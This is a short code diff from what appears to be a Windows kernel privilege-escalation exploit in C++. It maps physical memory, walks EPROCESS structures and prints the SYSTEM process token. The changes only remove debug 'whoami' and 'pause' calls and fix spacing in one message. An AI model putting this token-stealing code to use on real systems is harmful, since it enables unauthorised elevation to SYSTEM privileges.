@@ -40,7 +40,7 @@ int main(int argc, char** argv)
 
 	// measure execution time of program
 	auto start = std::chrono::high_resolution_clock::now();
-	system("whoami");
+
 	if (GetWindowsOffsets() == -1) {
 		fprintf(stderr, "[!] GetWindowsOffsets() failed");
 		return EXIT_FAILURE;
@@ -102,7 +102,7 @@ int main(int argc, char** argv)
 		PVOID castedBuf = *buf;
 		castedBuf = (unsigned char*)castedBuf + (EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
-		printf("[+]System Token found: %p\n", (void*)*(unsigned __int64*)castedBuf);
+		printf("[+] System Token found: %p\n", (void*)*(unsigned __int64*)castedBuf);
 		systemToken = *(unsigned __int64*)castedBuf;
 		if (UnmapPhysicalMemory(buf) == FALSE) {
 			printf("UnmapPhysicalMemory failed\n");
@@ -146,7 +146,6 @@ int main(int argc, char** argv)
 	auto stop = std::chrono::high_resolution_clock::now();
 	auto duration = std::chrono::duration_cast<std::chrono::seconds>(stop - start);
 	printf("Duration to execute the Program in seconds: %lld\n", duration.count());
-	system("whoami");
-	system("pause");
+
 	return EXIT_SUCCESS;
 }
